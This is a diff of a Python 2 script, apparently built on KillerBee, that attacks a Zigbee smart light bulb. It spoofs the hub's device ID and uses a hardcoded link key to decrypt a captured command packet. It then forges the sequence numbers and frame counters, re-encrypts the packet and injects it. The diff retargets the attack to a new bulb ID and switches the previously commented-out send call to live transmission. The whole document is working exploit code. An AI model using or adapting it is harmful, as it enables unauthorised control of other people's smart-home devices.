@@ -37,10 +37,10 @@ import os
 DEFAULT_KB_CHANNEL = 11
 DEFAULT_KB_DEVICE = '10.10.10.2'
 SOURCE_DEVICE_ID = '0x0000' # Spoofed device ID (smart hub)
-TARGET_DEVICE_ID = "F973" # light bulb to be hacked
+TARGET_DEVICE_ID =  "45BA" #"F973" # light bulb to be hacked
 command_packet_file = "command_packet_format"
-TURN_ON_COMMAND_CODE = '\x01'
-TURN_OFF_COMMAND_CODE = '\x00'
+TURN_ON_COMMAND_CODE = 1
+TURN_OFF_COMMAND_CODE = 0
 LINK_KEY = '\xdf\x42\xb5\x95\x6a\x2b\xbd\x46\x18\x8d\x59\x0a\xdb\x04\xb6\x09'
 
 
@@ -70,7 +70,7 @@ print "Payload is encrypted!"
 print "Decrypting message..."
 print "Encrypted: " + encrypted_command_packet.payload.payload.payload.fields['data'].encode('hex')
 decrypted_command_packet_payload = kbdecrypt(encrypted_command_packet, key = LINK_KEY, verbose = 0)
-PrintHelper.reaviling_string("Decrypted: ", decrypted_command_packet_payload.do_build().encode('hex'))
+PrintHelper.reaviling_string("Decrypted: ", decrypted_command_packet_payload.do_build().encode('hex'), 0.01)
 print ""
 
 # Advance injected packet sequence numbers
@@ -82,6 +82,7 @@ next_zigbee_cluster_seq_num = DEFAULT_LAST_ZIGBEE_CLUSTER_SEQ_NUM + 1
 
 
 # Update fields upon crafted sequence numbers:
+#decrypted_command_packet_payload.payload.fields['command_identifier'] = TURN_ON_COMMAND_CODE
 decrypted_command_packet_payload.payload.fields['transaction_sequence'] = next_zigbee_cluster_seq_num
 decrypted_command_packet_payload.fields['counter'] = next_zigbee_app_counter
 encrypted_command_packet.fields['seqnum'] = next_ieee_seq_num
@@ -89,6 +90,8 @@ encrypted_command_packet.getlayer(ZigbeeNWK).fields['seqnum'] = next_zigbeeNWK_s
 encrypted_command_packet.getlayer(ZigbeeSecurityHeader).fields['fc'] = next_zigbee_frame_counter
 encrypted_command_packet.payload.fields['dest_addr'] = int(TARGET_DEVICE_ID,16)
 encrypted_command_packet.payload.payload.fields['destination'] = int(TARGET_DEVICE_ID,16)
+
+print decrypted_command_packet_payload.do_build().encode('hex')
 
 sys.stdout.write("Encrypting message...")
 encrypted_command_packet_to_inject = kbencrypt(encrypted_command_packet, decrypted_command_packet_payload, key = LINK_KEY, verbose = 0)
@@ -99,6 +102,4 @@ print "Injecting packet..."
 PrintHelper.print_string_as_packet("Packet data", encrypted_command_packet_to_inject.do_build().encode('hex'))
 
 print ""
-#kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 1, verbose = 3)
-
-
+kbsendp(encrypted_command_packet_to_inject, channel = DEFAULT_KB_CHANNEL, inter = 0, loop = 0, iface = DEFAULT_KB_DEVICE, count = 1, verbose = 3)
